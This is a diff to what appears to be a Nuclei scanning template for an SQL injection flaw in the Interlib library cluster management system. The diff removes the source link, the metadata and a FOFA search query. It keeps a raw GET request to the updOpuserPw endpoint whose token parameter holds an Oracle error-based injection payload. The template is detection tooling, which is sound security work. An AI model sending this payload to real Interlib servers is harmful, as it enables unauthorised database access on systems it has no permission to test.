@@ -3,12 +3,8 @@ info:
   name: Interlib图书馆集群管理系统updOpuserPw token SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/raggh5wrvspoawu0'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: raggh5wrvspoawu0
-    fofa: body="interlib"
 http:
 - raw:
   - 'GET /interlib3/service/sysop/updOpuserPw?loginid=123&newpassword=123&token=1%27and+ctxsys.drithsx.sn(1,(select%201024*1024%20from%20dual))=%272 HTTP/1.1
